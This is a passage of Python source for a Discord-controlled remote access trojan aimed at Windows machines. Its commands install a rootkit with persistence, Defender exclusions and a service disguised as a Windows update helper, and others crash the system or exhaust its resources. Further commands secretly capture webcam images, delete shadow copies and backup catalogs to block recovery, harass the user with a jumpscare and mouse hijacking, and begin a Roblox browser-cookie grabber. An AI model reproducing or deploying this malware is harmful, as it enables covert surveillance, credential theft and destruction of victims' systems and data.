    await ctx.send(f"The current directory is: {current_directory}")

default_password = "123"
lock_text = "Windows is locked. Enter the password to unlock."
count = 3
lock_window = None
current_password = default_password  # Stores the current password

@bot.command()
async def rootkit(ctx):
    """Install advanced rootkit with multiple persistence and hiding techniques"""
    try:
        await ctx.send("🔒 Installing rootkit components...")
        
        # Get current process ID and name
        current_pid = os.getpid()
        current_process = psutil.Process(current_pid)
        process_name = current_process.name()
        
        # 1. Hide from Task Manager using registry
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            await ctx.send("✅ Task Manager disabled")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to disable Task Manager: {str(e)}")

        # 2. Add process to exclusion list
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options")
            winreg.CreateKey(key, process_name)
            await ctx.send("✅ Process added to system exclusions")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to add process exclusion: {str(e)}")

        # 3. Modify process attributes for stealth
        try:
            # Get process handle
            PROCESS_ALL_ACCESS = 0x1F0FFF
            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, current_pid)
            
            if handle:
                # Hide process from debuggers
                ctypes.windll.ntdll.NtSetInformationProcess(handle, 0x1D, ctypes.byref(ctypes.c_int(1)), 4)
                
                # Set process priority to below normal to avoid attention
                ctypes.windll.kernel32.SetPriorityClass(handle, 0x00004000)  # BELOW_NORMAL_PRIORITY_CLASS
                
                ctypes.windll.kernel32.CloseHandle(handle)
                await ctx.send("✅ Process attributes modified for stealth")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to modify process attributes: {str(e)}")

        # 4. Create system service for persistence
        try:
            service_path = os.path.abspath(sys.argv[0])
            service_cmd = f'''cmd /c sc create "Windows Update Helper" binPath= "{service_path}" start= auto'''
            subprocess.run(service_cmd, shell=True, capture_output=True)
            await ctx.send("✅ System service installed")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to create service: {str(e)}")

        # 5. Add to Windows Defender exclusions
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{process_name}"'], 
                         capture_output=True)
            await ctx.send("✅ Added to Defender exclusions")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to add Defender exclusion: {str(e)}")

        # 6. Modify process memory protection
        try:
            PAGE_EXECUTE_READWRITE = 0x40
            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, current_pid)
            if handle:
                # Get process base address
                base_address = ctypes.c_void_p()
                size = ctypes.c_size_t()
                ctypes.windll.kernel32.VirtualQueryEx(handle, 0, ctypes.byref(base_address), ctypes.sizeof(size))
                
                # Change memory protection
                old_protect = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtectEx(
                    handle, 
                    base_address, 
                    size.value,
                    PAGE_EXECUTE_READWRITE,
                    ctypes.byref(old_protect)
                )
                
                ctypes.windll.kernel32.CloseHandle(handle)
                await ctx.send("✅ Memory protection modified")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to modify memory protection: {str(e)}")

        # 7. Hide window
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                await ctx.send("✅ Console window hidden")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to hide window: {str(e)}")

        # 8. Add registry persistence
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, service_path)
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, service_path)
            await ctx.send("✅ Registry persistence established")
        except Exception as e:
            await ctx.send(f"⚠️ Failed to add registry persistence: {str(e)}")

        await ctx.send("✅ Rootkit installation completed successfully")
        
    except Exception as e:
        await ctx.send(f"❌ Rootkit installation failed: {str(e)}")

@bot.command()
async def bsod(ctx):
    """Trigger a real Blue Screen of Death (BSOD)."""
    await ctx.send("WARNING: Triggering BSOD... Your system will crash immediately!")

    try:
        # Adjust privileges
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))

        # Trigger the BSOD
        ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022,  # Status code: Access Denied
            0,           # Number of arguments
            0,           # Arguments (None)
            0,           # Reserved
            6,           # Option: Shutdown the system
            ctypes.byref(ctypes.c_ulong())
        )
    except Exception as e:
        await ctx.send(f"Failed to trigger BSOD: {e}")

@bot.command()
async def processes(ctx):
    # Get all running process names
    process_list = [proc.name() for proc in psutil.process_iter()]
    
    # Split the list into chunks to fit within Discord's message limit
    max_length = 2000 - 7  # Adjust for the code block formatting
    current_chunk = "```\n"  # Start with the code block opening

    for process in process_list:
        # Check if adding this process would exceed the max length
        if len(current_chunk) + len(process) + 1 > max_length:
            # Send the current chunk if it exceeds the limit
            current_chunk += "\n```"  # Close the code block before sending
            await ctx.send(current_chunk)  # Send the chunk
            current_chunk = "```\n" + process  # Start a new chunk with the current process
        else:
            # Add the process to the current chunk
            current_chunk += (process + "\n")

    # Send any remaining processes in the last chunk
    if current_chunk != "```\n":  # Ensure there's something to send
        current_chunk += "```"  # Close the code block
        await ctx.send(current_chunk)

# Dictionary to store blacklisted processes

@bot.command()
async def kill(ctx, process_name: str):
    """Kill a specified process by name."""
    killed = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            proc.terminate()
            killed = True
            await ctx.send(f"Process '{process_name}' has been terminated.")
            break
    
    if not killed:
        await ctx.send(f"No process named '{process_name}' found.")

# Initialize Pygame mixer
pygame.mixer.init()

@bot.command()
async def play(ctx, *, filename: str = None):
    if filename is None:
        # Handle attached file
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
            await attachment.save(temp_file.name)
            temp_file.close()
            filename = temp_file.name  # Use the temporary file's name
        else:
            await ctx.send("No filename provided and no attachment found.")
            return
    else:
        # Check if the provided file exists
        if not os.path.isfile(filename):
            await ctx.send(f"File '{filename}' not found.")
            return

    try:
        # Play the file
        pygame.mixer.music.load(filename)
        pygame.mixer.music.play()
        await ctx.send(f"Playing '{filename}'...")
    except Exception as e:
        await ctx.send(f"An error occurred while trying to play the file: {e}")
    finally:
        # Clean up the temporary file
        if 'temp_file' in locals():
            os.remove(temp_file.name)

def turn_off_monitors():
    """Turn off all monitors using multiple methods"""
    try:
        # Method 1: Using Win32GUI
        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
        
        # Method 2: Using ctypes
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    except Exception as e:
        print(f"Monitor off error: {e}")

def turn_on_monitors():
    """Turn on all monitors using multiple methods"""
    try:
        # Method 1: Using Win32GUI
        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
        
        # Method 2: Using mouse movement
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        
        # Method 3: Simulate mouse movement to ensure wake
        import win32api
        x, y = win32api.GetCursorPos()
        win32api.SetCursorPos((x+1, y+1))
        win32api.SetCursorPos((x, y))
    except Exception as e:
        print(f"Monitor on error: {e}")

@bot.command()
async def monitors_off(ctx):
    """Turn off all monitors"""
    try:
        # Send confirmation message before turning off
        embed = Embed(title="🖥️ Turning Off Monitors", description="Monitors will be turned off in 3 seconds...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)
        
        # Wait 3 seconds
        await asyncio.sleep(3)
        
        # Turn off monitors
        turn_off_monitors()
        
        # Update message
        embed = Embed(title="🖥️ Monitors Turned Off", description="All monitors have been turned off successfully!", color=0x00FF00)
        embed.add_field(
            name="💡 Note",
            value="```Use .monitors_on to turn the monitors back on```",
            inline=False
        )
        await msg.edit(embed=embed)
        
    except Exception as e:
        error_embed = Embed(title="❌ Error", description=f"```{str(e)}```", color=0xFF0000)
        await ctx.send(embed=error_embed)

@bot.command()
async def monitors_on(ctx):
    """Turn on all monitors"""
    try:
        turn_on_monitors()
        
        embed = Embed(title="🖥️ Monitors Turned On", description="All monitors have been turned on successfully!", color=0x00FF00)
        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = Embed(title="❌ Error", description=f"```{str(e)}```", color=0xFF0000)
        await ctx.send(embed=error_embed)

def spam_apps():
    """Execute multiple system-intensive operations to consume resources."""
    while True:
        try:
            # Process spawning - using shell=False for better stability
            subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.Popen("notepad.exe", creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Memory consumption - more controlled to prevent system crash
            memory_hog = []
            try:
                for _ in range(50):  # Reduced from 1024 for better control
                    memory_hog.append('A' * 524288)  # 512KB chunks
            except MemoryError:
                pass
            
            # File operations - with better error handling
            try:
                temp_dir = os.getenv('TEMP')
                if temp_dir and os.path.exists(temp_dir):
                    for i in range(5):  # Reduced from 10 for better control
                        try:
                            with open(os.path.join(temp_dir, f'temp_{i}.txt'), 'w') as f:
                                f.write('A' * 524288)  # 512KB files
                        except:
                            continue
            except:
                pass
            
            # CPU intensive operations
            try:
                for _ in range(10000):  # Reduced from 100000 for better control
                    hash('A' * 100)
            except:
                pass
            
            # Small delay to prevent complete system freeze
            time.sleep(0.5)
            
        except Exception:
            time.sleep(1)  # If any error occurs, wait a bit before continuing
            continue

@bot.command()
async def forkbomb(ctx):
    """Execute a controlled forkbomb attack with multiple resource-intensive operations."""
    try:
        # Check if already running
        if hasattr(ctx.bot, 'forkbomb_running') and ctx.bot.forkbomb_running:
            error_embed = Embed(
                title="⚠️ Forkbomb Already Active",
                description="A forkbomb attack is already in progress.",
                color=0xFFA500
            )
            await ctx.send(embed=error_embed)
            return

        # Send initial status
        status_embed = Embed(
            title="🚀 Initializing Forkbomb",
            description="Launching system-intensive operations...",
            color=EMBED_COLOR
        )
        msg = await ctx.send(embed=status_embed)
        
        # Set running flag
        ctx.bot.forkbomb_running = True
        
        # Start the attack in a separate thread
        thread = threading.Thread(target=spam_apps)
        thread.daemon = True
        thread.start()
        
        # Update status
        success_embed = Embed(
            title="✅ Forkbomb Active",
            description="System resources are being consumed.\nUse `.kill forkbomb` to stop the attack.",
            color=EMBED_COLOR
        )
        await msg.edit(embed=success_embed)
        
    except Exception as e:
        ctx.bot.forkbomb_running = False
        error_embed = Embed(
            title="❌ System Error",
            description=f"An unexpected error occurred:\n```{str(e)}```",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@bot.command()
async def webcam(ctx):
    """Capture webcam frame stealthily without LED indicator"""
    try:
        # Create temporary file for image
        temp_path = os.path.join(os.getenv('TEMP'), f'frame_{random.randint(1000,9999)}.jpg')
        
        # Use DirectShow to access webcam at lower level
        try:
            import comtypes.client as cc
            import win32com.client
            
            # Create DirectShow filter graph
            graph_builder = cc.CreateObject("FilterGraph")
            capture_builder = cc.CreateObject("CaptureGraphBuilder2")
            capture_builder.SetFiltergraph(graph_builder)
            
            # Get system device enumerator
            dev_enum = cc.CreateObject("SystemDeviceEnum")
            video_enum = dev_enum.CreateClassEnumerator("Video Input Device Category", 0)
            
            if video_enum:
                try:
                    # Get first video device
                    video_device = video_enum.Next(1)[0]
                    video_filter = video_device.BindToObject(None, None, "IBaseFilter")
                    
                    # Add video filter to graph
                    graph_builder.AddFilter(video_filter, "Video Capture")
                    
                    # Configure capture parameters to minimize LED trigger
                    stream_config = capture_builder.FindInterface(
                        None, None, video_filter, "IAMStreamConfig"
                    )
                    
                    if stream_config:
                        # Set lowest possible resolution and framerate
                        media_type = stream_config.GetFormat()
                        media_type.SetFrameRate(1)  # 1 fps
                        media_type.SetResolution(320, 240)  # Low res
                        stream_config.SetFormat(media_type)
                    
                    # Create sample grabber for frame capture
                    sample_grabber = cc.CreateObject("SampleGrabber")
                    graph_builder.AddFilter(sample_grabber, "Sample Grabber")
                    
                    # Configure sample grabber
                    sample_grabber.SetBufferSamples(True)
                    sample_grabber.SetOneShot(True)
                    
                    # Start capture
                    media_control = graph_builder.QueryInterface("IMediaControl")
                    media_control.Run()
                    
                    # Wait minimal time for frame
                    time.sleep(0.1)
                    
                    # Get frame buffer
                    buffer = sample_grabber.GetCurrentBuffer()
                    
                    # Convert to image
                    import numpy as np
                    from PIL import Image
                    
                    frame = np.frombuffer(buffer, dtype=np.uint8)
                    frame = frame.reshape((240, 320, 3))
                    image = Image.fromarray(frame)
                    
                    # Save image
                    image.save(temp_path, 'JPEG')
                    
                    # Stop capture immediately
                    media_control.Stop()
                    
                finally:
                    # Clean up
                    for obj in [video_filter, sample_grabber, graph_builder, capture_builder]:
                        if obj:
                            obj.Release()
            
        except:
            # Fallback to low-level VideoCapture if DirectShow fails
            import cv2
            
            # Try to bypass LED by configuring camera properties
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Use DirectShow backend
            
            # Configure for stealth
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)  # Low resolution
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
            cap.set(cv2.CAP_PROP_FPS, 1)  # Minimum framerate
            cap.set(cv2.CAP_PROP_BRIGHTNESS, 0)  # Minimum brightness
            cap.set(cv2.CAP_PROP_EXPOSURE, -8)  # Minimum exposure
            
            # Quick capture
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(temp_path, frame)
            
            # Release immediately
            cap.release()
            cv2.destroyAllWindows()
        
        # Send image if captured
        if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
            await ctx.send(file=discord.File(temp_path))
            os.remove(temp_path)
        else:
            raise Exception("Failed to capture frame")
            
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def reagentcenable(ctx):
    """Enables Windows Recovery Environment and factory reset options silently"""
    try:
        embed = Embed(title="🔄 System Recovery Configuration", description="Enabling recovery options...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)

        success_count = 0
        error_messages = []

        def run_command_silently(command):
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(
                    command,
                    shell=True,
                    startupinfo=startupinfo,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    text=True
                )
                return True, result.stdout
            except subprocess.CalledProcessError as e:
                return False, e.stderr
            except Exception as e:
                return False, str(e)

        # 1. Enable Windows RE
        success, output = run_command_silently('reagentc /enable')
        if success:
            success_count += 1
        else:
            error_messages.append("WinRE Enable: " + output)

        # 2. Set boot options
        commands = [
            'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
            'bcdedit /set {default} recoveryenabled Yes',
            'bcdedit /set {current} recoveryenabled Yes',
            'reagentc /boottowre 1',
            'reagentc /setreimage /path %windir%\\system32\\recovery',
            'reagentc /enable'
        ]

        for cmd in commands:
            success, output = run_command_silently(cmd)
            if success:
                success_count += 1
            else:
                error_messages.append(f"Command Failed: {cmd}")

        # 3. Enable recovery partition if available
        success, output = run_command_silently('reagentc /info')
        if "Windows RE Status: Enabled" in output:
            success_count += 1

        # 4. Set registry keys for recovery
        reg_paths = [
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows RE", "EnableWinRE", 1),
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows RE", "AutoReboot", 1),
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisplayRecoveryOptions", 1)
        ]

        for path, name, value in reg_paths:
            try:
                with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                success_count += 1
            except Exception as e:
                error_messages.append(f"Registry Error: {path}\\{name}")

        # Final status message
        if success_count > 0:
            success_embed = Embed(
                title="✅ Recovery Options Enabled",
                description="System recovery features have been configured.",
                color=EMBED_COLOR
            )
            success_embed.add_field(
                name="📊 Status",
                value=f"Successfully applied {success_count} configurations",
                inline=False
            )
            if error_messages:
                success_embed.add_field(
                    name="⚠️ Warnings",
                    value="```\n" + "\n".join(error_messages[:3]) + "```",
                    inline=False
                )
            await msg.edit(embed=success_embed)
        else:
            raise Exception("Failed to apply any recovery configurations")

    except Exception as e:
        error_embed = Embed(
            title="❌ Configuration Error",
            description=f"Failed to enable recovery options:\n```{str(e)}```",
            color=0xFF0000
        )
        await msg.edit(embed=error_embed)

@bot.command()
async def reagentcdisable(ctx):
    """Completely disables factory reset and recovery options from both boot and settings"""
    try:
        embed = Embed(title="🔄 System Configuration", description="Updating system settings...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)

        success_count = 0
        error_messages = []

        def run_command_silently(command):
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(
                    command,
                    shell=True,
                    startupinfo=startupinfo,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    text=True
                )
                return True, result.stdout
            except subprocess.CalledProcessError as e:
                return False, e.stderr
            except Exception as e:
                return False, str(e)

        # 1. Disable WinRE and Recovery
        recovery_commands = [
            'reagentc /disable',  # Disable WinRE
            'bcdedit /delete {current} /cleanup',  # Remove current boot entry from cleanup
            'reagentc /boottowre 0',  # Disable boot to WinRE
            'bcdedit /set {bootmgr} displaybootmenu no',  # Hide boot menu
            'bcdedit /set {default} recoveryenabled no',  # Disable recovery for default
            'bcdedit /set {current} recoveryenabled no',  # Disable recovery for current
            'bcdedit /set {default} bootstatuspolicy ignoreallfailures',  # Ignore boot failures
            'bcdedit /set {current} bootstatuspolicy ignoreallfailures',  # Ignore boot failures for current
            'bcdedit /set {default} recovery no',  # Disable recovery environment
            'vssadmin delete shadows /all /quiet',  # Delete shadow copies
            'wbadmin delete catalog -quiet'  # Delete backup catalog
        ]

        for cmd in recovery_commands:
            success, _ = run_command_silently(cmd)
            if success:
                success_count += 1

        # 2. Disable through registry
        reg_paths = [
            # Disable WinRE
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows RE", "EnableWinRE", 0),
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows RE", "AutoReboot", 0),
            # Hide Recovery Options
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisplayRecoveryOptions", 0),
            # Disable Reset This PC
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableResetMyPC", 1),
            # Disable Recovery Environment
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore", "DisableConfig", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore", "DisableSR", 1),
            # Disable Advanced Startup
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableAdvancedStartup", 1),
            # Disable F8 Boot Options
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableF8BootMenu", 1),
            # Disable System Restore
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "RPSessionInterval", 0),
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableRestoreDataLog", 1),
            # Disable Recovery Console
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole", "SecurityLevel", 0),
            (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole", "SetCommand", 0)
        ]

        for path, name, value in reg_paths:
            try:
                with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                success_count += 1
            except:
                error_messages.append(f"Registry: {path}\\{name}")

        # 3. Remove recovery partition
        try:
            # Create diskpart script
            script_content = """list disk
select disk 0
list partition
select partition 1
set id=27
detail partition
exit"""
            script_path = os.path.join(os.environ['TEMP'], 'disable_recovery.txt')
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            # Run diskpart to hide recovery partition
            success, _ = run_command_silently(f'diskpart /s "{script_path}"')
            if success:
                success_count += 1
            
            # Clean up script
            try:
                os.remove(script_path)
            except:
                pass
        except:
            error_messages.append("Recovery Partition: Failed to modify")

        # 4. Disable System Restore
        system_restore_commands = [
            'net stop wmiApSrv /y >nul 2>&1',
            'net stop SDRSVC /y >nul 2>&1',
            'sc config SDRSVC start=disabled >nul 2>&1',
            'sc config wmiApSrv start=disabled >nul 2>&1',
            'powershell -Command "Disable-ComputerRestore -Drive C:\\"',
            'vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB >nul 2>&1'
        ]

        for cmd in system_restore_commands:
            success, _ = run_command_silently(cmd)
            if success:
                success_count += 1

        # Final status message
        if success_count > 0:
            success_embed = Embed(
                title="✅ System Settings Updated",
                description="System maintenance completed successfully.",
                color=EMBED_COLOR
            )
            success_embed.add_field(
                name="📊 Status",
                value=f"Applied {success_count} system optimizations",
                inline=False
            )
            if error_messages:
                success_embed.add_field(
                    name="⚠️ Notifications",
                    value="```\n" + "\n".join(error_messages[:3]) + "```",
                    inline=False
                )
            await msg.edit(embed=success_embed)
        else:
            raise Exception("Failed to apply system configurations")

    except Exception as e:
        error_embed = Embed(
            title="❌ Configuration Error",
            description=f"Failed to update system settings:\n```{str(e)}```",
            color=0xFF0000
        )
        await msg.edit(embed=error_embed)

@bot.command()
async def block_website(ctx, website: str):
    """Block a website by adding it to the system's hosts file."""
    # Ensure the website is not already blocked (optional)
    hosts_path = "/etc/hosts"  # Linux or MacOS path
    if os.name == 'nt':  # If on Windows
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

    try:
        # Open the hosts file in append mode
        with open(hosts_path, "a") as hosts_file:
            # Add the entry to block the website
            hosts_file.write(f"127.0.0.1 {website}\n")
        
        await ctx.send(f"Website {website} has been blocked.")
    except PermissionError:
        # If the bot doesn't have permission to modify the hosts file
        await ctx.send("Permission denied. Ensure the bot is running with admin privileges.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def jumpscare(ctx):
    """Execute an advanced jumpscare with multiple effects"""
    try:
        embed = Embed(title="👻 Initializing...", description="Preparing system effects...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)

        def run_command_silently(command):
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                subprocess.run(
                    command,
                    shell=True,
                    startupinfo=startupinfo,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except:
                pass

        # Create temp directory for assets
        temp_dir = os.path.join(os.getenv('TEMP'), f'sys_{random.randint(1000,9999)}')
        os.makedirs(temp_dir, exist_ok=True)

        # Scary images URLs (use your own hosted images)
        images = [
            "https://github.com/AizenWo/Python/blob/main/Jumpscare/Jumpscare.jpg",
            "https://github.com/AizenWo/Python/blob/main/Jumpscare/Jumpscare1.jpg",
            "https://github.com/AizenWo/Python/blob/main/Jumpscare/Jumpscare2.jpg"
        ]

        # Download images
        image_paths = []
        for i, url in enumerate(images):
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    img_path = os.path.join(temp_dir, f'scare_{i}.jpg')
                    with open(img_path, 'wb') as f:
                        f.write(response.content)
                    image_paths.append(img_path)
            except:
                continue

        # Create jumpscare window class
        window_script = """
import tkinter as tk
from PIL import Image, ImageTk
import random
import threading
import time
import os
import pygame
import ctypes

class JumpscareWindow:
    def __init__(self, image_paths):
        self.image_paths = image_paths
        self.windows = []
        self.running = True
        
        # Initialize pygame for sound
        pygame.mixer.init()
        
        # Get screen dimensions
        user32 = ctypes.windll.user32
        self.screen_width = user32.GetSystemMetrics(0)
        self.screen_height = user32.GetSystemMetrics(1)
        
        # Create multiple windows
        for _ in range(4):
            self.create_window()
        
        # Start effect threads
        threading.Thread(target=self.flash_screen, daemon=True).start()
        threading.Thread(target=self.move_windows, daemon=True).start()
        threading.Thread(target=self.play_sounds, daemon=True).start()
        
    def create_window(self):
        window = tk.Tk()
        window.overrideredirect(True)
        window.attributes('-topmost', True)
        window.attributes('-alpha', 0.9)
        
        # Load random image
        img_path = random.choice(self.image_paths)
        img = Image.open(img_path)
        img = img.resize((self.screen_width // 2, self.screen_height // 2))
        photo = ImageTk.PhotoImage(img)
        
        label = tk.Label(window, image=photo)
        label.image = photo
        label.pack()
        
        self.windows.append(window)
        
    def flash_screen(self):
        while self.running:
            for window in self.windows:
                window.attributes('-alpha', random.uniform(0.3, 1.0))
            time.sleep(0.1)
    
    def move_windows(self):
        while self.running:
            for window in self.windows:
                x = random.randint(0, self.screen_width - 100)
                y = random.randint(0, self.screen_height - 100)
                window.geometry(f'+{x}+{y}')
            time.sleep(0.2)
    
    def play_sounds(self):
        sounds = ['scream.mp3', 'laugh.mp3', 'horror.mp3']
        while self.running:
            try:
                sound = random.choice(sounds)
                pygame.mixer.music.load(sound)
                pygame.mixer.music.play()
                time.sleep(random.uniform(1, 3))
            except:
                pass
    
    def run(self):
        self.windows[0].mainloop()
    
    def stop(self):
        self.running = False
        for window in self.windows:
            window.destroy()

# Run jumpscare
jumpscare = JumpscareWindow(IMAGES)
jumpscare.run()
"""

        # Save the script
        script_path = os.path.join(temp_dir, 'scare.py')
        with open(script_path, 'w') as f:
            f.write(window_script)

        # Prepare scary sounds
        sounds = {
            'scream.mp3': 'https://github.com/AizenWo/Python/blob/main/Jumpscare/jumpscare-94984.mp3',
            'laugh.mp3': 'https://github.com/AizenWo/Python/blob/main/Jumpscare/screamer-jumpscare-66896.mp3',
            'horror.mp3': 'https://github.com/AizenWo/Python/blob/main/Jumpscare/smile-dog-jumpscare-167171.mp3'
        }

        # Download sounds
        for filename, url in sounds.items():
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    sound_path = os.path.join(temp_dir, filename)
                    with open(sound_path, 'wb') as f:
                        f.write(response.content)
            except:
                continue

        # Maximize volume
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(0.0, None)  # Max volume
        except:
            pass

        # Execute jumpscare
        success_embed = Embed(
            title="👻 Jumpscare Activated",
            description="Executing visual and audio effects...",
            color=EMBED_COLOR
        )
        await msg.edit(embed=success_embed)

        # Run the script
        subprocess.Popen(
            ['python', script_path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            cwd=temp_dir
        )

        # Additional effects
        try:
            # Disable task manager
            run_command_silently('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
            
            # Flash screen using PowerShell
            ps_command = """
            Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class Tricks {
                [DllImport("user32.dll")]
                public static extern int SwapMouseButton(int bSwap);
                
                [DllImport("user32.dll")]
                public static extern int GetSystemMetrics(int nIndex);
                
                [DllImport("user32.dll")]
                public static extern bool SetCursorPos(int X, int Y);
            }
"@
            while($true) {
                $width = [Tricks]::GetSystemMetrics(0)
                $height = [Tricks]::GetSystemMetrics(1)
                [Tricks]::SetCursorPos((Get-Random -Min 0 -Max $width), (Get-Random -Min 0 -Max $height))
                [Tricks]::SwapMouseButton(1)
                Start-Sleep -Milliseconds 100
                [Tricks]::SwapMouseButton(0)
                Start-Sleep -Milliseconds 100
            }
            """
            
            with open(os.path.join(temp_dir, 'effects.ps1'), 'w') as f:
                f.write(ps_command)
            
            # Run PowerShell effects
            subprocess.Popen(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-File', os.path.join(temp_dir, 'effects.ps1')],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass

    except Exception as e:
        error_embed = Embed(
            title="❌ Effect Error",
            description=f"Failed to execute effects:\n```{str(e)}```",
            color=0xFF0000
        )
        await msg.edit(embed=error_embed)

@bot.command()
async def roblox(ctx):
    """Advanced Roblox cookie grabber with multi-browser support"""
    try:
        embed = Embed(title="🔍 Searching for Roblox Cookies", description="Scanning browsers...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)

        # Kill Chrome process
        try:
            subprocess.call("TASKKILL /f /IM CHROME.EXE")
        except:
            pass

        # Get cookie using primary method
        cookie = None
        try:
            local_state_path = os.path.join(os.environ["USERPROFILE"], 
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
